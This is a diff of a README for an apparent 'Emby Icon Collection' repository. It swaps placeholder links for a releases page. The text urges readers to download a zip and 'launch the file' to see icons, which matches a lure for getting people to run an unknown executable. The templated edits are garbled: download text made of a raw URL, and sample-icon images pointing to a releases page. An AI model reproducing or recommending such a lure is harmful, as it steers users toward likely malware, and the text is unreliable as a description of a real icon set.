@@ -8,7 +8,7 @@ Welcome to the Emby Icon Collection repository! This project features a curated 
 - **Topics:** not provided
 
 ### Access the Collection:
-👉 **[Download App.zip](https://github.com/repo/releases/9246/App.zip)** 👈
+👉 **[Download https://github.com/unknown801/Emby-icon-collection/releases](https://github.com/unknown801/Emby-icon-collection/releases)** 👈
 
 *(Note: The link ends with the file name. Launch the file to access the collection.)*
 
@@ -16,20 +16,20 @@ Welcome to the Emby Icon Collection repository! This project features a curated 
 The Emby Icon Collection repository is organized into different categories for easy browsing and selection. Whether you are looking for icons related to movies, TV shows, music, or other media types, you will find a diverse range of options to choose from.
 
 ### How to Use:
-1. Simply download the provided App.zip file by clicking the link above.
+1. Simply download the provided https://github.com/unknown801/Emby-icon-collection/releases file by clicking the link above.
 2. Unzip the file to reveal the collection of Emby icons.
 3. Select the icon you want to use and integrate it into your Emby media server for a personalized touch.
 
 ### Sample Icons:
 Here are a few examples of the stunning Emby icons you will find in this collection:
 
-![Movie Icon](https://example.com/movie-icon.jpg)
+![Movie Icon](https://github.com/unknown801/Emby-icon-collection/releases)
 *Icon for Movies*
 
-![TV Shows Icon](https://example.com/tv-shows-icon.jpg)
+![TV Shows Icon](https://github.com/unknown801/Emby-icon-collection/releases)
 *Icon for TV Shows*
 
-![Music Icon](https://example.com/music-icon.jpg)
+![Music Icon](https://github.com/unknown801/Emby-icon-collection/releases)
 *Icon for Music*
 
 ### Explore More:
